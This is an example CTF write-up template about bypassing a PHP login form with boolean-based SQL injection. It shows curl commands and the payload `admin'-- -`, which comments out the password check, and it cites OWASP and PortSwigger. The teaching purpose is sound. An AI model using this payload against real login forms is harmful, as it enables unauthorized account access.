# [EXAMPLE] Login Bypass via Boolean-Based SQL Injection

> This is a filled EXAMPLE writeup showing how to use TEMPLATE.md. Delete this folder once you've added your first real writeup, or keep it as a style reference.

| Field | Value |
|---|---|
| **CTF / Event** | Example CTF 2026 |
| **Category** | Web |
| **Difficulty** | Easy |
| **Points** | 100 |
| **Date Solved** | 2026-08-02 |
| **Tools Used** | Burp Suite, curl, sqlmap (verification only) |

---

## 1. Challenge Description

> "Can you get into the admin panel? Here's the login page: http://target.ctf/login"
> Attached: none, black-box web app.

---

## 2. Recon

- Visited the login page — standard username/password form, POST to `/login`
- Checked response headers with curl — backend was PHP, likely MySQL given error patterns seen later
- Tried a single `'` in the username field — got a raw SQL error reflected in the response, confirming unsanitized input reaching the query

```bash
curl -s -X POST http://target.ctf/login \
  -d "username=admin'&password=x"
# Response leaked: "You have an error in your SQL syntax..."
```

---

## 3. Analysis

- The raw SQL error confirmed the query was likely something like:
  `SELECT * FROM users WHERE username='$username' AND password='$password'`
- Classic boolean-based injection candidate — goal: make the WHERE clause always evaluate true without needing the real password
- Ruled out blind/time-based injection since the error was already visible directly — no need for the extra complexity

---

## 4. Exploitation

```bash
curl -s -X POST http://target.ctf/login \
  -d "username=admin'-- -&password=anything"
```

- `admin'-- -` closes the string literal after `admin` and comments out the rest of the query (including the password check)
- Resulting query effectively becomes: `SELECT * FROM users WHERE username='admin'-- -' AND password='anything'`
- Logged in as admin without knowing the real password

---

## 5. Flag

```
flag{example_format_sqli_login_bypass_100pts}
```

---

## 6. Lessons Learned

- Always test the simplest injection (`'`, `"`, `--`) before jumping to automated tools — it's faster and teaches you more
- Verbose SQL errors are a huge tell — if a target leaks them, authentication logic is worth checking first
- Next time: try this same payload against any login form before deeper recon, since it costs seconds to rule out

---

## References

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Academy](https://portswigger.net/web-security/sql-injection)
